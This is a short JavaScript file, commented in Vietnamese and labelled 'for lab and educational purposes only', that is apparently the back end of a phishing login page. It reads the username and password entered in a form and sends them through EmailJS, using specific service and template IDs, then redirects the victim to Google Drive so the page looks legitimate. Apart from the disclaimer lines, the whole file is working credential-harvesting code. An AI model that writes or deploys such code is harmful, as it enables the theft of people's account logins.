// This is for lab and educational purposes only.
let form = document.getElementById("myForm");

function validateForm(event) {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // Kiểm tra dữ liệu
    if (username.trim() === "" || password.trim() === "") {
        event.preventDefault(); // Ngăn form gửi đi
        alert("Vui lòng điền đầy đủ thông tin!");
        return false;
    } else {
        sendMail(); // Gửi email sau khi kiểm tra hợp lệ
        return false; // Ngăn việc reload trang sau khi gửi
    }
}

function sendMail() {
    let params = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    };

    emailjs.send("service_1ba32z7", "template_xz4qfs6", params)
        .then(function(response) {
            alert("Email đã được gửi thành công!");
            console.log("Success:", response);
            
            // Chuyển hướng sang Facebook sau khi gửi thành công
            window.location.href = "https://drive.google.com";
        })
        .catch(function(error) {
            alert("Có lỗi xảy ra khi gửi email.");
            console.log("Error:", error);
        });
}
// This is for lab and educational purposes only.